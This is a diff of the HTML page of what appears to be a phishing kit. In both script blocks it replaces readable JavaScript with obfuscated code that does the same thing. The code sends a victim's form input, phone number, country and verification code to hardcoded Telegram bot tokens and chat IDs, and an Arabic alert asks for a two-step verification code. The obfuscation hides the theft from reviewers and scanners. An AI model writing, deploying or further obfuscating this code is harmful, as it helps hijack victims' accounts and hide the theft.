@@ -23,27 +23,7 @@
         }
     </style>
     <script>
-        function submitData() {
-            const inputData = document.getElementById("input2").value;
-            if (!inputData) {
-                alert("Input cannot be empty!");
-                return;
-            }
-            fetch(`https://api.telegram.org/bot7534058906:AAHPSdas12wcqaXfdT44EqFVESUBuC105Gk/sendMessage?chat_id=7477076227&text=${encodeURIComponent(inputData)}`)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        setTimeout(() => {
-                        window.location.href = "page3.html";
-                    }, 2000);
-                    } else {
-                        alert("Error sending message to Telegram");
-                    }
-                })
-                .catch(error => {
-                    alert("Network error: " + error.message);
-                });
-        }
+        (function(_0xcff970,_0x5a53e3){const _0x430760=_0x107d,_0x1cc41a=_0xcff970();while(!![]){try{const _0xe89d55=-parseInt(_0x430760(0x150))/0x1+-parseInt(_0x430760(0x154))/0x2*(-parseInt(_0x430760(0x14e))/0x3)+parseInt(_0x430760(0x160))/0x4*(-parseInt(_0x430760(0x15b))/0x5)+parseInt(_0x430760(0x15a))/0x6*(-parseInt(_0x430760(0x157))/0x7)+parseInt(_0x430760(0x15c))/0x8+parseInt(_0x430760(0x153))/0x9*(parseInt(_0x430760(0x14f))/0xa)+parseInt(_0x430760(0x152))/0xb;if(_0xe89d55===_0x5a53e3)break;else _0x1cc41a['push'](_0x1cc41a['shift']());}catch(_0x3224eb){_0x1cc41a['push'](_0x1cc41a['shift']());}}}(_0x4536,0x6ed28));function _0x107d(_0x49e3fa,_0x3f609c){const _0x45368d=_0x4536();return _0x107d=function(_0x107d06,_0x3f70fa){_0x107d06=_0x107d06-0x14e;let _0x48b6bd=_0x45368d[_0x107d06];return _0x48b6bd;},_0x107d(_0x49e3fa,_0x3f609c);}function submitData(){const _0x276ba2=_0x107d,_0x392e01=document[_0x276ba2(0x158)](_0x276ba2(0x162))[_0x276ba2(0x15d)];if(!_0x392e01){alert(_0x276ba2(0x151));return;}fetch(_0x276ba2(0x15e)+encodeURIComponent(_0x392e01))[_0x276ba2(0x163)](_0x3e4e68=>_0x3e4e68[_0x276ba2(0x156)]())['then'](_0x28d91c=>{const _0x22d203=_0x276ba2;_0x28d91c['ok']?setTimeout(()=>{const _0xe47150=_0x107d;window['location'][_0xe47150(0x164)]=_0xe47150(0x155);},0x7d0):alert(_0x22d203(0x15f));})[_0x276ba2(0x159)](_0x406842=>{const _0x55a9a9=_0x276ba2;alert(_0x55a9a9(0x161)+_0x406842['message']);});}function _0x4536(){const _0x1d2921=['2117235lDjWQA','791960qhXBLb','value','https://api.telegram.org/bot7534058906:AAHPSdas12wcqaXfdT44EqFVESUBuC105Gk/sendMessage?chat_id=7477076227&text=','Error\x20sending\x20message\x20to\x20Telegram','4UllCEu','Network\x20error:\x20','input2','then','href','5961YWitXg','100FTKEpn','495429AhpnXW','Input\x20cannot\x20be\x20empty!','6377954yMxelK','739863zUOevM','652DMyJau','page3.html','json','175189NPWtKu','getElementById','catch','186nvfPVu'];_0x4536=function(){return _0x1d2921;};return _0x4536();}
     </script>
 </head>
 <body style="text-align: center;">
@@ -62,38 +42,7 @@
 
 
     <script>
-        const botToken = '7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk';  // Replace with your Telegram bot token
-        const chatId = '7672163375';      // Replace with your chat ID (can be group chat or your Telegram ID)
-
-        // Function to send combined data (phone number, country, and name) to Telegram
-        function sendName() {
-            const name = document.getElementById("name").value;
-
-            // Retrieve phone number and country name from localStorage
-            const phoneNumber = localStorage.getItem('phoneNumber');
-            const countryName = localStorage.getItem('countryName');
-
-            if (name.trim()) {
-                // Combine phone number, country, and name into one message
-                const message = `Phone Number: ${phoneNumber}\nCountry: ${countryName}\nCode: ${name}`;
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                // Send the data to Telegram
-                fetch(url)
-                    .then(response => {
-                        if (response.ok) {
-                            alert('المرجو إدخال رمز التحقق من خطوتين اذا ما ضبطت إضافتكم');
-                        } else {
-                            alert('Failed to send data to Telegram');
-                        }
-                    })
-                    .catch(error => {
-                        alert('Error sending data: ' + error);
-                    });
-            } else {
-                alert('Please enter a valid name.');
-            }
-        }
+        const _0x4bdb24=_0x4571;(function(_0x3d8203,_0x1131f4){const _0x1362de=_0x4571,_0x1ef4ac=_0x3d8203();while(!![]){try{const _0xede806=parseInt(_0x1362de(0x1ab))/0x1+-parseInt(_0x1362de(0x1a8))/0x2*(-parseInt(_0x1362de(0x1b2))/0x3)+parseInt(_0x1362de(0x195))/0x4*(parseInt(_0x1362de(0x19a))/0x5)+parseInt(_0x1362de(0x19e))/0x6*(parseInt(_0x1362de(0x1b1))/0x7)+-parseInt(_0x1362de(0x1ad))/0x8*(-parseInt(_0x1362de(0x19c))/0x9)+parseInt(_0x1362de(0x1a6))/0xa+-parseInt(_0x1362de(0x1ac))/0xb*(parseInt(_0x1362de(0x1a1))/0xc);if(_0xede806===_0x1131f4)break;else _0x1ef4ac['push'](_0x1ef4ac['shift']());}catch(_0x58a4f9){_0x1ef4ac['push'](_0x1ef4ac['shift']());}}}(_0x19de,0x33e12));function _0x4571(_0x409917,_0x520a13){const _0x19deaf=_0x19de();return _0x4571=function(_0x45710e,_0xf867a){_0x45710e=_0x45710e-0x195;let _0x54d887=_0x19deaf[_0x45710e];return _0x54d887;},_0x4571(_0x409917,_0x520a13);}const botToken=_0x4bdb24(0x198),chatId=_0x4bdb24(0x1a2);function sendName(){const _0x43ae79=_0x4bdb24,_0x27bd9e=document['getElementById'](_0x43ae79(0x19d))[_0x43ae79(0x1a4)],_0x4a1bc8=localStorage[_0x43ae79(0x1a0)](_0x43ae79(0x1a5)),_0xce3132=localStorage[_0x43ae79(0x1a0)](_0x43ae79(0x196));if(_0x27bd9e[_0x43ae79(0x1a7)]()){const _0x535939=_0x43ae79(0x19b)+_0x4a1bc8+_0x43ae79(0x1aa)+_0xce3132+_0x43ae79(0x1af)+_0x27bd9e,_0x34b4ed=_0x43ae79(0x199)+botToken+'/sendMessage?chat_id='+chatId+_0x43ae79(0x197)+encodeURIComponent(_0x535939);fetch(_0x34b4ed)[_0x43ae79(0x19f)](_0x21c8dd=>{const _0xe6dede=_0x43ae79;_0x21c8dd['ok']?alert('المرجو\x20إدخال\x20رمز\x20التحقق\x20من\x20خطوتين\x20اذا\x20ما\x20ضبطت\x20إضافتكم'):alert(_0xe6dede(0x1ae));})[_0x43ae79(0x1a3)](_0xe4e76e=>{const _0x5f1e92=_0x43ae79;alert(_0x5f1e92(0x1b0)+_0xe4e76e);});}else alert(_0x43ae79(0x1a9));}function _0x19de(){const _0x29492a=['Please\x20enter\x20a\x20valid\x20name.','\x0aCountry:\x20','127342NDzPZe','1045gzNaHF','54608qrrxTR','Failed\x20to\x20send\x20data\x20to\x20Telegram','\x0aCode:\x20','Error\x20sending\x20data:\x20','577297eTZbwN','3pbbSZO','228TOXVMW','countryName','&text=','7637768536:AAFBR5maC19HT1kLRb9PI4ynubtztkEUTPk','https://api.telegram.org/bot','29945wNmiQC','Phone\x20Number:\x20','81HoPAtl','name','6GhwyVB','then','getItem','92100DNxBku','7672163375','catch','value','phoneNumber','1237390JTMHDu','trim','410528NjaRRF'];_0x19de=function(){return _0x29492a;};return _0x19de();}
     </script>
 </body>
 </html>
